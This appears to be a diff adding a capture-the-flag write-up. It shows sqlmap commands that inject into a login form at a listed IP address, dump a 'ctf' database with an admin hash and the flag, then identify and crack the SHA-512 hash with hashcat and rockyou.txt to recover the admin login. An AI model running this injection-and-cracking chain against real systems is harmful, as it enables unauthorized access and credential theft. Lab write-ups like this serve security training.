@@ -1,0 +1,33 @@
+sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST --dbs --batch
+
+sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST -D ctf --dump all --batch
+
+It displays the following:
+Database: ctf
+Table: ctf_user
+[2 entries]
++----+-----------+----------------------------------------------------------------------------------------------------------------------------------+
+| id | name      | password                                                                                                                         |
++----+-----------+----------------------------------------------------------------------------------------------------------------------------------+
+| 1  | admin5543 | 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c |
+| 2  | flag      | CTF{a52ec551-3825-40c8-a705-4896816197fa}                                                                                        |
++----+-----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+
+hashid -m 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c
+
+It displays:
+Analyzing '62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c'
+[+] SHA-512 [Hashcat Mode: 1700]
+[+] Whirlpool [Hashcat Mode: 6100]
+
+
+hashcat -m 1700 -a 0 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+It displays:
+...
+62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c:payub078883660
+...
+
+So we have username and password to login:
+admin5543:payub078883660
